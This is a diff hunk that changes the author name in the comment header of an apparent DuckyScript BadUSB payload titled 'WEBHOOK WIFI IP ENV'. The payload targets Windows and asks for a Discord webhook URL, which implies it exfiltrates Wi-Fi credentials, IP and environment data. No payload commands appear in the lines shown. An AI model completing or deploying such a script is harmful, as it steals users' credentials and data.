@@ -1,5 +1,5 @@
 REM Title:          WEBHOOK WIFI IP ENV
-REM By:             Achyon
+REM By:             T-achyon
 REM Target:         Windows 10/11 TESTED (CMD + Powershell)
 REM Discord URL:    INSERISCI IL LINK AL WEBHOOK DOVE RICHIESTO MANTENENDO IL VIRGOLETTATO
 REM Legal:          This script is for educational purposes only please do not use this for malicious purposes
